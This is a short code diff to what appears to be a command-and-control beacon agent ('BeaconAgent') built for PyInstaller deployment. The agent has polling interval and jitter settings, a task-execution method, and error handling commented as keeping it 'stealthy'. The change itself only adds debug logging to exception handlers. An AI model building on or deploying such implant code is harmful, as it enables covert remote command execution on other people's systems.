@@ -5,6 +5,7 @@ Can be compiled with PyInstaller for deployment.
 """
 
 import os
+import logging
 import sys
 import time
 import json
@@ -72,8 +73,8 @@ class BeaconAgent:
                 self.interval = data.get("interval", 60)
                 self.jitter = data.get("jitter", 10)
                 return True
-        except Exception:
-            pass
+        except Exception as _exc:
+            logging.debug(f"Suppressed in agent.py: {_exc}")
         return False
 
     def execute_task(self, command: str) -> dict:
@@ -120,7 +121,7 @@ class BeaconAgent:
                 if new_results:
                     self.beacon(results=new_results)
                     
-        except Exception:
+        except Exception as e:
             pass # Suppress network errors to stay stealthy
 
     def run(self):
